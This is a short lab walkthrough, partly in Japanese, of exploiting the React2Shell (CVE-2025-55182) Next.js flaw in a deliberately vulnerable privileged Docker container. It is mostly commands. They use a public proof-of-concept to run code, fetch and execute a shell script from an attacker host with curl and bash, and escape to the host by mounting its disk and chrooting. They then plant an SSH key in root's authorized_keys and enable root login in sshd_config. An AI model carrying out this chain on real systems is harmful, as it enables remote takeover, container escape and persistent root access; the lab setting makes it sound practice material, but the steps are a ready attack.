## Vuln
- React2Shell(CVE-2025-55182)
#### Raedy
- Dockerfile
```
FROM vulhub/nextjs:15.5.6

USER root

RUN apt-get update \
 && apt-get install -y curl wget \
 && rm -rf /var/lib/apt/lists/*
```
- docker-compose.yml
```
services:
  web:
    build: .
    privileged: true
    ports:
      - "3000:3000"
```

#### Recon
- `nuclei -u 192.168.31.160:3000 -t http`
#### RCE
- `git clone https://github.com/surajhacx/react2shellpoc.gi`
- `cd react2shellpoc`
- `python3 exploit.py -t http://localhost:1337/ -c "whoami"`
- `python3 exploit.py -t http://192.168.31.160:3000/ -c 'curl 192.168.31.154/shell.sh -o shell.sh'`
- `python3 exploit.py -t http://192.168.31.160:3000/ -c 'bash ./shell.sh'`

#### Docker Escape
```
mount /dev/sda2 /mnt 
mount --bind /dev /mnt/dev 
mount --bind /proc /mnt/proc 
mount --bind /sys /mnt/sys 
chroot /mnt 
```

## Ready to SSH
#### By Kali
- `ssh-keygen -t rsa -b 4096 -f id_rsa_docker_escape`
- `cat id_rsa_docker_escape.pub`

#### By Victim
- `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> /root/.ssh/authorized_keys`
- `cat /root/.ssh/authorized_keys`
- `ls -la /root/.ssh`
  - `-rw------- root root authorized_keys`
- SSH が有効か確認
  - `cat /etc/ssh/sshd_config | grep PermitRootLogin`
    - OK
      - `PermitRootLogin prohibit-password`
      - `PermitRootLogin yes`
    - NG
      - `PermitRootLogin no`
          - `sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config`
#### By kali
- `ssh -i id_rsa_docker_escape root@HOST_IP`
